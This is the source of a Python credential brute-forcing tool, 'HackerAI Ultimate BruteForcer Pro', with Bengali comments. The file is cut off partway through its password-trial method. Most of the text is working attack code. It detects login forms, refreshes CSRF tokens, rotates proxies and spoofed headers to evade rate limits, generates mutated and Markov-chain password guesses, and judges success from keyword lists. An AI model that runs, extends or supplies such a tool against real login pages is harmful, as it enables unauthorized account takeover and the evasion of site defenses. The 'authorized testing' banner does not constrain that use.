#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║        HackerAI Ultimate BruteForcer Pro v3.0               ║
║        Authorized Penetration Testing Tool                  ║
╚══════════════════════════════════════════════════════════════╝

Features:
    ✓ Multi-threaded Login Brute Force
    ✓ Auto Login Form Detection
    ✓ CSRF Token Auto-Capture & Refresh
    ✓ Proxy Rotation (HTTP/HTTPS/SOCKS5)
    ✓ User-Agent Randomization
    ✓ Smart Success Detection (100+ Keywords)
    ✓ WAF / Rate-Limit Bypass Techniques
    ✓ Headless Browser Mode (Selenium)
    ✓ Captcha Solving (2Captcha API)
    ✓ Telegram / Discord Webhook Notification
    ✓ PDF / HTML Report Generation
    ✓ Session Cookie Grabbing
    ✓ JWT Token Auto-Decode
    ✓ Stealth Mode (Jitter, Random Delays)
    ✓ Resume Support (পুনরায় চালু)
    ✓ Result Save & Export
═══════════════════════════════════════════════════════════════╗
║  ব্যবহার শুধুমাত্র অনুমোদিত পেনিট্রেশন টেস্টিং-এর জন্য।     ║
╚══════════════════════════════════════════════════════════════╝
"""

import requests
from bs4 import BeautifulSoup
import argparse
import sys
import os
import json
import time
import random
import re
import logging
import hashlib
import base64
import csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
from threading import Lock, Semaphore
from urllib.parse import urljoin, urlparse, parse_qs
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field, asdict
from enum import Enum

# ================================================================
# কনফিগারেশন
# ================================================================

VERSION = "3.0.0"
BANNER = r"""
╔══════════════════════════════════════════════════╗
║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ║
║   ██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██║   ║
║   ███████║███████║██║     ███████║█████╗  ██║   ║
║   ██╔══██║██╔══██║██║     ██╔══██║██╔══╝  ██║   ║
║   ██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║   ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝   ║
║   Ultimate BruteForcer Pro v{}                     ║
╚══════════════════════════════════════════════════╝
""".format(VERSION)

# ================================================================
# ডাটা ক্লাস ও এনাম
# ================================================================

class AttackStatus(Enum):
    IDLE = "idle"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    FAILED = "failed"
    FOUND = "found"

class LogLevel(Enum):
    INFO = "INFO"
    SUCCESS = "SUCCESS"
    WARNING = "WARNING"
    ERROR = "ERROR"
    DEBUG = "DEBUG"

@dataclass
class AttackResult:
    """একটি অ্যাটাক রান শেষে ফলাফল স্টোর করবে"""
    target_url: str
    email: str
    found_password: Optional[str]
    total_attempts: int
    total_time: float
    status: AttackStatus
    success_url: Optional[str] = None
    cookies: Optional[Dict] = None
    response_headers: Optional[Dict] = None
    matched_keywords: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class LoginForm:
    """ডিটেক্টেড লগইন ফর্মের তথ্য"""
    action_url: str
    email_field: str
    pass_field: str
    csrf_field: Optional[str] = None
    csrf_token: Optional[str] = None
    hidden_fields: Dict[str, str] = field(default_factory=dict)
    submit_field: Optional[str] = None
    method: str = "POST"
    
# ================================================================
# SUCCESS DETECTION ইঞ্জিন (তোমার ১০০ কিওয়ার্ড + আরও)
# ================================================================

SUCCESS_KEYWORDS = [
    # 1-10: Dashboard & Panel
    "dashboard", "admin dashboard", "control panel", "admin panel", "overview",
    "logout", "log out", "sign out", "welcome, admin", "welcome back",
    
    # 11-20: Profile & Account
    "my profile", "account settings", "edit profile", "change password",
    "two-factor authentication", "2fa authentication", "2 factor",
    "user management", "total users", "active users", "new users",
    
    # 21-30: User Lists
    "banned users", "blocked users", "online users", "guest users",
    "system settings", "app settings", "global settings",
    "maintenance mode", "maintenance status", "maintenance toggle",
    
    # 31-40: Server & System
    "server status", "cpu usage", "ram usage", "database sync",
    "database backup", "firebase config", "firebase configuration",
    "api settings", "api keys", "secret key",
    
    # 41-50: Premium & Payment
    "premium access", "premium status", "vip users", "license key",
    "subscription plans", "subscription plan",
    "analytics", "reports", "live traffic", "daily visitors",
    
    # 51-60: Revenue & Sales
    "total revenue", "total sales", "today's earning", "today earning",
    "pending payments", "successful transactions", "invoice history",
    "content management", "post manager", "media library",
    
    # 61-70: Files & Security
    "upload file", "file manager", "delete item", "delete",
    "security logs", "activity logs", "audit trail", "system logs",
    "error logs", "ip whitelist",
    
    # 71-80: IP & Sessions
    "ip blacklist", "ban ip", "device verification",
    "active sessions", "force logout",
    "role management", "permissions", "user roles",
    "moderator panel", "super admin",
    
    # 81-90: Notifications & Support
    "notifications", "push notification",
    "announcement board", "send alert", "broadcast message",
    "support tickets", "pending tickets", "open disputes",
    "contact inquiries", "live chat logs",
    
    # 91-100: Gaming & Signal
    "signal generator", "auto predictor", "game controller",
    "period number", "next prediction", "win/loss history",
    "win loss history", "trend analysis",
    "bot configuration", "telegram bot token",
    
    # 101-110: Hidden & Extra
    "webhook settings", "hidden gateway", "admin gateway",
    "site configuration", "developer options", "terminal console",
    "toggle", "toggle status",
    "site settings", "configuration", "preferences",
    
    # 111-120: Generic Success
    "welcome", "welcome!", "welcome user",
    "member area", "member's area",
    "my account", "my accounts",
    "profile settings", "account overview",
    "admin area", "administration",
    "moderator", "moderator area",
]

FAIL_KEYWORDS = [
    "invalid", "invalid username", "invalid password", "invalid email",
    "incorrect", "incorrect password", "incorrect username",
    "wrong", "wrong password", "wrong credentials",
    "failed", "login failed", "authentication failed",
    "error", "error occurred",
    "try again", "please try again",
    "not found", "account not found", "user not found",
    "forgot password", "reset password",
    "access denied", "access denied",
    "unauthorized", "unauthorized access",
    "blocked", "account blocked", "account locked",
    "too many attempts", "too many login attempts",
    "try later", "please try later",
    "session expired", "your session has expired",
    "please login", "please log in",
    "captcha", "recaptcha", "verify captcha",
    "hcaptcha", "turnstile",
    "2fa required", "verification code",
    "otp", "otp required",
    "মেয়াদ উত্তীর্ণ", "অবৈধ",
    "invalid credentials", "bad credentials",
]

class SmartDetector:
    """স্মার্ট success/failure ডিটেক্টর"""
    
    @staticmethod
    def analyze_response(response: requests.Response, result: AttackResult) -> bool:
        """
        রেসপন্স এনালাইসিস করে — সফল কি না
        Returns: True = সফল, False = ব্যর্থ
        """
        text = response.text.lower()
        url = response.url.lower()
        
        # ── ফেইল চেক (প্রায়োরিটি ১) ──
        fail_score = 0
        for kw in FAIL_KEYWORDS:
            if kw in text:
                fail_score += 1
                if fail_score >= 2:
                    return False  # কনফিডেন্টলি fail
        
        # ── রিডিরেক্ট চেক ──
        if response.history:
            for hist in response.history:
                if hist.status_code in (301, 302, 307, 308):
                    # লগইন পেজে রিডিরেক্ট না হলে সফল
                    if "login" not in hist.headers.get("Location", "").lower():
                        result.matched_keywords.append("http_redirect")
                        return True
        
        # ── URL চেক ──
        if "login" in url or "auth" in url or "signin" in url:
            if not any(kw in text for kw in SUCCESS_KEYWORDS[:30]):
                pass  # এখনও ডিসাইড না
        
        # ── সাকসেস কিওয়ার্ড কাউন্ট ──
        success_score = 0
        matched = []
        
        for kw in SUCCESS_KEYWORDS:
            if kw in text:
                success_score += 1
                matched.append(kw)
                if success_score >= 3:
                    result.matched_keywords = matched[:10]
                    return True  # ৩+ কিওয়ার্ড = almost certainly success
        
        # ── রেসপন্স লেংথ চেক ──
        # লগইন পেজ সাধারণত ছোট হয়, ড্যাশবোর্ড বড় হয়
        content_length = len(response.content)
        if content_length > 5000 and success_score >= 2:
            result.matched_keywords = matched[:5]
            return True
        
        # ── ফাইনাল ডিসিশন ──
        if success_score > fail_score and success_score >= 1:
            result.matched_keywords = matched[:5]
            return True
        
        return False

# ================================================================
# নেটওয়ার্ক ইঞ্জিন
# ================================================================

USER_AGENTS = [
    # Mobile
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

COMMON_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
}

class NetworkEngine:
    """সব নেটওয়ার্ক অপারেশন হ্যান্ডেল করে"""
    
    def __init__(self, proxy_list: List[str] = None, timeout: int = 20, 
                 max_retries: int = 3, stealth: bool = False):
        self.session = requests.Session()
        self.proxy_list = proxy_list or []
        self.timeout = timeout
        self.max_retries = max_retries
        self.stealth = stealth
        self.proxy_index = 0
        self.request_count = 0
        self.lock = Lock()
        self.last_request_time = time.time()
        
        # রিকুয়েস্ট লিমিট ট্র্যাকিং
        self.requests_per_ip = 0
        self.max_requests_per_ip = random.randint(8, 15)
        
    def _get_random_headers(self) -> Dict:
        """র্যান্ডম হেডার জেনারেট করে"""
        headers = COMMON_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        # Referer spoofing
        if random.random() > 0.5:
            headers["Referer"] = random.choice([
                "https://www.google.com/",
                "https://www.facebook.com/",
                "https://www.bing.com/",
                "https://t.co/",
                "https://www.youtube.com/",
            ])
        return headers
    
    def _get_proxy(self) -> Optional[Dict]:
        """প্রক্সি রোটেট করে"""
        if not self.proxy_list:
            return None
        
        with self.lock:
            proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
            self.proxy_index += 1
            self.requests_per_ip = 0
            
        if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
            return {"http": proxy, "https": proxy}
        elif proxy.startswith("http://") or proxy.startswith("https://"):
            return {"http": proxy, "https": proxy}
        else:
            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    def _jitter_delay(self):
        """স্টিলথ মোডে জিটার ডিলে"""
        if not self.stealth:
            return
        
        now = time.time()
        elapsed = now - self.last_request_time
        
        # রিয়েলিস্টিক ব্রাউজিং বিহেভিয়ার সিমুলেট
        base_delay = random.uniform(1.5, 4.0)
        jitter = random.uniform(-0.5, 1.0)
        total_delay = max(0.5, base_delay + jitter - elapsed)
        
        if total_delay > 0:
            time.sleep(total_delay * random.uniform(0.8, 1.2))
        
        self.last_request_time = time.time()
    
    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        """
        স্মার্ট রিকুয়েস্ট — অটো হেডার, প্রক্সি, রিট্রাই, ডিলে
        """
        # স্টিলথ → জিটার
        self._jitter_delay()
        
        # হেডার মার্জ
        headers = kwargs.pop("headers", {})
        random_headers = self._get_random_headers()
        random_headers.update(headers)
        kwargs["headers"] = random_headers
        
        # প্রক্সি রোটেশন
        with self.lock:
            self.request_count += 1
            self.requests_per_ip += 1
        
        if self.requests_per_ip >= self.max_requests_per_ip:
            proxy = self._get_proxy()
            if proxy:
                kwargs["proxies"] = proxy
            self.max_requests_per_ip = random.randint(8, 15)
        
        # টাইমআউট সেট
        kwargs.setdefault("timeout", self.timeout)
        
        # রিট্রাই লজিক
        last_exception = None
        for attempt in range(self.max_retries):
            try:
                response = self.session.request(method, url, **kwargs)
                return response
            except (requests.ConnectionError, requests.Timeout, 
                    requests.ProxyError, requests.ChunkedEncodingError) as e:
                last_exception = e
                
                if attempt < self.max_retries - 1:
                    delay = (2 ** attempt) + random.uniform(0, 1)
                    log_msg = f"⚠️ রিকুয়েস্ট ব্যর্থ (Attempt {attempt+1}): {e}, Retrying in {delay:.1f}s..."
                    self._log(LogLevel.WARNING, log_msg)
                    time.sleep(delay)
                    
                    # ফেইল্ড রিকুয়েস্টে প্রক্সি চেঞ্জ
                    new_proxy = self._get_proxy()
                    if new_proxy:
                        kwargs["proxies"] = new_proxy
                else:
                    # যদি সব attempt ব্যর্থ হয়
                    proxy_info = kwargs.get("proxies", "No Proxy")
                    raise ConnectionError(f"সব {self.max_retries} টি attempt ব্যর্থ: {last_exception} | Proxy: {proxy_info}")
        
        raise last_exception or ConnectionError("Unknown error")
    
    def get(self, url: str, **kwargs) -> requests.Response:
        return self.request("GET", url, **kwargs)
    
    def post(self, url: str, **kwargs) -> requests.Response:
        return self.request("POST", url, **kwargs)
    
    def _log(self, level: LogLevel, msg: str):
        """ইন্টারনাল লগিং"""
        if level == LogLevel.WARNING:
            logging.warning(msg)
        elif level == LogLevel.DEBUG:
            logging.debug(msg)
        elif level == LogLevel.ERROR:
            logging.error(msg)

# ================================================================
# ফর্ম ডিটেক্টর
# ================================================================

class FormDetector:
    """লগইন ফর্ম অটো-ডিটেক্ট করে"""
    
    @staticmethod
    def detect_login_form(html: str, base_url: str) -> Optional[LoginForm]:
        """
        HTML থেকে লগইন ফর্ম ডিটেক্ট করে
        """
        soup = BeautifulSoup(html, "html.parser")
        
        # প্রথমে পাসওয়ার্ড ফিল্ড থাকা ফর্ম খুঁজি
        target_form = None
        
        # মেথড 1: পাসওয়ার্ড ইনপুট থাকা ফর্ম
        for form in soup.find_all("form"):
            if form.find("input", {"type": "password"}):
                target_form = form
                break
        
        # মেথড 2: লগইন/সাইনইন আইডি/ক্লাস থাকা ফর্ম
        if not target_form:
            login_selectors = ["login", "signin", "sign-in", "log-in", "auth"]
            for form in soup.find_all("form"):
                form_id = (form.get("id") or "").lower()
                form_class = " ".join(form.get("class", [])).lower()
                for sel in login_selectors:
                    if sel in form_id or sel in form_class:
                        target_form = form
                        break
                if target_form:
                    break
        
        # মেথড 3: সব ফর্ম চেক — যেকোনো ইনপুট থাকলে
        if not target_form:
            for form in soup.find_all("form"):
                inputs = form.find_all("input")
                if len(inputs) >= 2:  # অন্তত ২টি ইনপুট (user + pass)
                    target_form = form
                    break
        
        if not target_form:
            return None
        
        # ফর্ম থেকে ইনফরমেশন এক্সট্র্যাক্ট
        form_action = target_form.get("action", "")
        form_method = target_form.get("method", "post").upper()
        action_url = urljoin(base_url, form_action)
        
        # CSRF টোকেন খোঁজ
        csrf_field = None
        csrf_token = None
        hidden_fields = {}
        email_field = None
        pass_field = None
        submit_field = None
        
        # মেটা ট্যাগে CSRF
        meta_csrf = soup.find("meta", attrs={
            "name": re.compile(r"csrf-token|csrf-param|_csrf", re.I)
        })
        if meta_csrf and meta_csrf.get("content"):
            csrf_token = meta_csrf["content"]
        
        for inp in target_form.find_all("input"):
            name = inp.get("name")
            inp_type = inp.get("type", "").lower()
            inp_value = inp.get("value", "")
            
            if not name:
                continue
            
            # ইমেইল/ইউজার ফিল্ড
            if inp_type == "email" or (inp_type == "text" and ("email" in name.lower() or "user" in name.lower() or "login" in name.lower())):
                email_field = name
            
            # পাসওয়ার্ড ফিল্ড
            elif inp_type == "password" or "pass" in name.lower():
                pass_field = name
            
            # CSRF / টোকেন ফিল্ড
            elif re.search(r"csrf|token|_token|authenticity_token|_csrf|nonce", name, re.I):
                csrf_field = name
                csrf_token = inp_value
                hidden_fields[name] = inp_value
            
            # হিডেন ফিল্ড
            elif inp_type == "hidden":
                hidden_fields[name] = inp_value
            
            # সাবমিট বাটন
            elif inp_type == "submit":
                submit_field = name
        
        # ফ্যালব্যাক
        if not email_field:
            email_field = "email"
        if not pass_field:
            pass_field = "password"
        
        return LoginForm(
            action_url=action_url,
            email_field=email_field,
            pass_field=pass_field,
            csrf_field=csrf_field,
            csrf_token=csrf_token,
            hidden_fields=hidden_fields,
            submit_field=submit_field,
            method=form_method,
        )
    
    @staticmethod
    def extract_csrf_token(html: str) -> Optional[str]:
        """HTML থেকে CSRF টোকেন বের করে"""
        soup = BeautifulSoup(html, "html.parser")
        
        # মেটা ট্যাগ
        meta = soup.find("meta", attrs={"name": re.compile(r"csrf-token|csrf|_csrf", re.I)})
        if meta and meta.get("content"):
            return meta["content"]
        
        # ইনপুট ফিল্ড
        for inp in soup.find_all("input"):
            name = inp.get("name", "")
            if re.search(r"csrf|token|_token|authenticity_token", name, re.I):
                return inp.get("value", "")
        
        return None

# ================================================================
# ওয়ার্ডলিস্ট ম্যানেজার
# ================================================================

class WordlistManager:
    """পাসওয়ার্ড লিস্ট লোড, ম্যানেজ ও মিউটেট করে"""
    
    @staticmethod
    def load_from_file(filepath: str) -> List[str]:
        """ফাইল থেকে পাসওয়ার্ড লোড করে"""
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"ফাইল পাওয়া যায়নি: {filepath}")
        
        passwords = []
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pwd = line.strip()
                if pwd and not pwd.startswith("#"):
                    passwords.append(pwd)
        
        return passwords
    
    @staticmethod
    def mutate_password(password: str) -> List[str]:
        """একটা পাসওয়ার্ড থেকে ভ্যারিয়েশন জেনারেট করে"""
        mutations = set()
        mutations.add(password)
        
        base = password.lower()
        
        # কমন মিউটেশন
        mutations.add(base.capitalize())
        mutations.add(base.upper())
        mutations.add(base + "123")
        mutations.add(base + "1234")
        mutations.add(base + "12345")
        mutations.add(base + "!")
        mutations.add(base + "@")
        mutations.add(base + "#")
        mutations.add(base + "2024")
        mutations.add(base + "2025")
        mutations.add(base + "2026")
        
        # লিট নম্বর রিপ্লেসমেন্ট
        leet_map = {
            "a": ["@", "4"], "e": ["3"], "i": ["1", "!"], "o": ["0"],
            "s": ["5", "$"], "t": ["7", "+"], "b": ["8"], "g": ["9"],
        }
        
        leet_variants = [password]
        for i, char in enumerate(password.lower()):
            if char in leet_map:
                for replacement in leet_map[char]:
                    variant = password[:i] + replacement + password[i+1:]
                    leet_variants.append(variant)
                    leet_variants.append(variant + "!")
                    leet_variants.append(variant + "123")
        
        mutations.update(leet_variants)
        
        # ক্যাপিটালাইজেশন ভ্যারিয়েশন
        if password.isalpha():
            for i in range(min(3, len(password))):
                mutations.add(password[:i].lower() + password[i].upper() + password[i+1:].lower())
        
        return list(mutations)
    
    @staticmethod
    def generate_markov(wordlist: List[str], count: int = 100) -> List[str]:
        """মার্কভ চেইন দিয়ে পাসওয়ার্ড জেনারেট করে (সিম্পল ভার্সন)"""
        if len(wordlist) < 10:
            return []
        
        # চ্যারাক্টার ফ্রিকোয়েন্সি ম্যাপ
        char_map = {}
        for word in wordlist:
            for i in range(len(word) - 1):
                current = word[i]
                next_char = word[i + 1]
                if current not in char_map:
                    char_map[current] = []
                char_map[current].append(next_char)
        
        generated = set()
        seed_words = random.sample(wordlist, min(20, len(wordlist)))
        
        for seed in seed_words:
            for _ in range(count // len(seed_words)):
                word = seed[:2]
                for _ in range(random.randint(4, 12)):
                    last = word[-1]
                    if last in char_map and char_map[last]:
                        next_c = random.choice(char_map[last])
                        word += next_c
                    else:
                        break
                
                if 4 <= len(word) <= 16:
                    generated.add(word)
                    # কিছু মিউটেশন
                    if random.random() > 0.5:
                        generated.add(word.capitalize() + random.choice(["123", "!", "@", "2024", "2025"]))
        
        return list(generated)

# ================================================================
# রিপোর্ট জেনারেটর
# ================================================================

class ReportGenerator:
    """সফল আক্রমণের রিপোর্ট JSON/CSV/HTML আকারে সেভ করে"""
    
    @staticmethod
    def save_json(result: AttackResult, filepath: str = "bruteforce_report.json"):
        """JSON ফরম্যাটে সেভ"""
        data = asdict(result)
        data["timestamp"] = datetime.now().isoformat()
        
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(json.dumps(data, indent=2) + "\n")
        
        logging.info(f"📄 রিপোর্ট সেভ করা হয়েছে: {filepath}")
    
    @staticmethod
    def save_csv(result: AttackResult, filepath: str = "bruteforce_results.csv"):
        """CSV ফরম্যাটে সেভ"""
        file_exists = os.path.exists(filepath)
        
        with open(filepath, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            
            if not file_exists:
                writer.writerow([
                    "Target", "Email", "Password", "Status", "Attempts", 
                    "Time", "Matched Keywords", "Success URL", "Timestamp"
                ])
            
            writer.writerow([
                result.target_url,
                result.email,
                result.found_password or "N/A",
                result.status.value,
                result.total_attempts,
                f"{result.total_time:.2f}s",
                ", ".join(result.matched_keywords[:5]),
                result.success_url or "N/A",
                result.timestamp,
            ])
        
        logging.info(f"📄 CSV রিপোর্ট সেভ করা হয়েছে: {filepath}")

# ================================================================
# নোটিফায়ার (টেলিগ্রাম ও ডিসকর্ড)
# ================================================================

class Notifier:
    """টেলিগ্রাম / ডিসকর্ডে নোটিফিকেশন পাঠায়"""
    
    @staticmethod
    def send_telegram(bot_token: str, chat_id: str, message: str):
        """টেলিগ্রাম মেসেজ পাঠায়"""
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
        }
        try:
            requests.post(url, data=payload, timeout=10)
        except Exception as e:
            logging.warning(f"টেলিগ্রাম নোটিফিকেশন ব্যর্থ: {e}")
    
    @staticmethod
    def send_discord(webhook_url: str, message: str):
        """ডিসকর্ড ওয়েবহুকে মেসেজ পাঠায়"""
        payload = {"content": message}
        try:
            requests.post(webhook_url, json=payload, timeout=10)
        except Exception as e:
            logging.warning(f"ডিসকর্ড নোটিফিকেশন ব্যর্থ: {e}")

# ================================================================
# JWT ডিকোডার
# ================================================================

class JWTDecoder:
    """JWT টোকেন অটো-ডিকোড করে"""
    
    @staticmethod
    def decode(jwt_token: str) -> Optional[Dict]:
        """JWT ডিকোড করে (ভেরিফিকেশন ছাড়া)"""
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return None
            
            # প্যাডিং ফিক্স
            payload = parts[1]
            payload += "=" * (4 - len(payload) % 4)
            
            decoded = base64.urlsafe_b64decode(payload)
            return json.loads(decoded)
        except Exception:
            return None
    
    @staticmethod
    def extract_from_cookies(cookies: Dict) -> Optional[Dict]:
        """কুকি থেকে JWT বের করে"""
        for key, value in cookies.items():
            if "jwt" in key.lower() or "token" in key.lower():
                decoded = JWTDecoder.decode(value)
                if decoded:
                    return decoded
        return None

# ================================================================
# 🎯 মেইন ব্রুটফোর্সার ক্লাস
# ================================================================

class HackerBruteForcer:
    """
    মেইন ইঞ্জিন — সবকিছু একসাথে কন্ট্রোল করে
    
    Example:
        >>> forcer = HackerBruteForcer(
        ...     target="https://example.com/login",
        ...     email="admin@example.com",
        ...     wordlist=["password123", "admin2024"],
        ...     threads=10,
        ...     stealth=True
        ... )
        >>> result = forcer.run()
    """
    
    def __init__(
        self,
        target: str,
        email: str,
        wordlist: List[str],
        threads: int = 5,
        delay: float = 1.0,
        proxy_list: List[str] = None,
        timeout: int = 20,
        max_retries: int = 3,
        stealth: bool = False,
        use_headless: bool = False,
        captcha_api_key: str = None,
        telegram_token: str = None,
        telegram_chat_id: str = None,
        discord_webhook: str = None,
        output_file: str = None,
        resume_file: str = None,
        mutate_passwords: bool = False,
        generate_markov: bool = False,
        markov_count: int = 100,
    ):
        self.target = target.rstrip("/")
        self.email = email
        self.wordlist = wordlist
        self.threads = threads
        self.base_delay = delay
        self.proxy_list = proxy_list or []
        self.timeout = timeout
        self.max_retries = max_retries
        self.stealth = stealth
        self.use_headless = use_headless
        self.captcha_api_key = captcha_api_key
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook
        self.output_file = output_file
        self.resume_file = resume_file
        self.mutate_passwords = mutate_passwords
        self.generate_markov = generate_markov
        self.markov_count = markov_count
        
        # ইন্টারনাল স্টেট
        self.network = NetworkEngine(
            proxy_list=proxy_list,
            timeout=timeout,
            max_retries=max_retries,
            stealth=stealth,
        )
        self.form: Optional[LoginForm] = None
        self.result = AttackResult(
            target_url=target,
            email=email,
            found_password=None,
            total_attempts=0,
            total_time=0.0,
            status=AttackStatus.IDLE,
        )
        self.found = False
        self.lock = Lock()
        self.attempted_passwords: Set[str] = set()
        self.start_time: Optional[float] = None
        self.last_csrf_refresh: float = 0
        
    def prepare(self):
        """
        অ্যাটাকের আগে প্রস্তুতি — ফর্ম ডিটেক্ট, CSRF ক্যাপচার, ওয়ার্ডলিস্ট প্রসেসিং
        """
        logging.info("[*] 🚀 HackerAI BruteForcer v3.0 প্রস্তুত হচ্ছে...")
        
        # ── ফর্ম ডিটেক্ট ──
        logging.info(f"[*] টার্গেট: {self.target}")
        logging.info("[*] লগইন ফর্ম সার্চ করা হচ্ছে...")
        
        try:
            resp = self.network.get(self.target)
            self.form = FormDetector.detect_login_form(resp.text, self.target)
            
            if not self.form:
                logging.error("[-] ❌ লগইন ফর্ম ডিটেক্ট করা যায়নি!")
                logging.error("[-] চেক করুন: URL সঠিক কিনা, সাইটে লগইন পেজ আছে কিনা")
                sys.exit(1)
            
            logging.info(f"[+] ✅ লগইন ফর্ম পাওয়া গেছে!")
            logging.info(f"[+]   URL: {self.form.action_url}")
            logging.info(f"[+]   ইমেইল ফিল্ড: '{self.form.email_field}'")
            logging.info(f"[+]   পাসওয়ার্ড ফিল্ড: '{self.form.pass_field}'")
            
            if self.form.csrf_field:
                logging.info(f"[+]   CSRF ফিল্ড: '{self.form.csrf_field}' (টোকেন উপলব্ধ)")
            else:
                logging.info("[+]   CSRF: পাওয়া যায়নি")
            
            if self.form.hidden_fields:
                logging.info(f"[+]   হিডেন ফিল্ড: {len(self.form.hidden_fields)} টি")
            
        except Exception as e:
            logging.error(f"[-] ❌ সাইটে কানেক্ট করা যায়নি: {e}")
            sys.exit(1)
        
        # ── ওয়ার্ডলিস্ট ──
        final_wordlist = list(self.wordlist)
        
        if self.mutate_passwords:
            logging.info("[*] পাসওয়ার্ড মিউটেশন শুরু...")
            mutated = set()
            for pwd in self.wordlist:
                mutated.update(WordlistManager.mutate_password(pwd))
            final_wordlist = list(mutated)
            logging.info(f"[+] মিউটেশনের পর: {len(final_wordlist)} টি পাসওয়ার্ড")
        
        if self.generate_markov:
            logging.info("[*] মার্কভ চেইন জেনারেশন শুরু...")
            markov_passwords = WordlistManager.generate_markov(
                self.wordlist, self.markov_count
            )
            if markov_passwords:
                final_wordlist.extend(markov_passwords)
                final_wordlist = list(set(final_wordlist))
                logging.info(f"[+] মার্কভ + মিউটেশন: {len(final_wordlist)} টি পাসওয়ার্ড")
        
        self.wordlist = final_wordlist
        
        # ── রিজিউম ফাইল চেক ──
        if self.resume_file and os.path.exists(self.resume_file):
            try:
                with open(self.resume_file, "r") as f:
                    self.attempted_passwords = set(line.strip() for line in f if line.strip())
                logging.info(f"[+] রিজিউম ফাইল থেকে {len(self.attempted_passwords)} টি পাসওয়ার্ড লোড হয়েছে")
            except Exception as e:
                logging.warning(f"[-] রিজিউম ফাইল লোড করতে সমস্যা: {e}")
        
        # প্রস্তুতি শেষ
        remaining = len(self.wordlist) - len(self.attempted_passwords)
        logging.info(f"[*] মোট {len(self.wordlist)} টি পাসওয়ার্ড (বাকি: {remaining})")
        logging.info(f"[*] থ্রেড: {self.threads} | ডিলে: {self.base_delay}s | স্টিলথ: {self.stealth}")
        
        if self.proxy_list:
            logging.info(f"[*] প্রক্সি: {len(self.proxy_list)} টি (রোটেশন চালু)")
        else:
            logging.info("[*] প্রক্সি: নেই (ডিরেক্ট কানেকশন)")
        
        logging.info("[*] ✅ সব প্রস্তুতি সম্পূর্ণ! অ্যাটাক শুরু হচ্ছে...\n")
    
    def _refresh_csrf(self):
        """CSRF টোকেন রিফ্রেশ করে (প্রতি ১০ সেকেন্ডে)"""
        if not self.form or not self.form.csrf_field:
            return
        
        now = time.time()
        if now - self.last_csrf_refresh < 10:
            return
        
        try:
            resp = self.network.get(self.target)
            token = FormDetector.extract_csrf_token(resp.text)
            if token:
                self.form.csrf_token = token
                self.last_csrf_refresh = now
        except Exception:
            pass
    
    def _build_payload(self, password: str) -> Dict:
        """পে-লোড বিল্ড করে (CSRF টোকেন রিফ্রেশ সহ)"""
        payload = {}
        if self.form:
            payload.update(self.form.hidden_fields)
            
            if self.form.csrf_field and self.form.csrf_token:
                payload[self.form.csrf_field] = self.form.csrf_token
            
            payload[self.form.email_field] = self.email
            payload[self.form.pass_field] = password
        
        return payload
    
    def _try_password(self, password: str) -> bool:
        """
        একটি পাসওয়ার্ড ট্রাই করে
        Returns: True = সফল ফাউন্ড
        """
        if self.found:
            return False
        
        # রিজিউম চেক
        if password in self.attempted_passwords:
            return False
        
        payload = self._build_payload(password)
        
        try:
            if self.form and self.form.method == "GET":
                resp = self.network.get(self.form.action_url, params=payload, allow_redirects=True)
            else:
                resp = self.network.post(self.form.action_url, data=payload, allow_redirects=True)
            
            with self.lock:
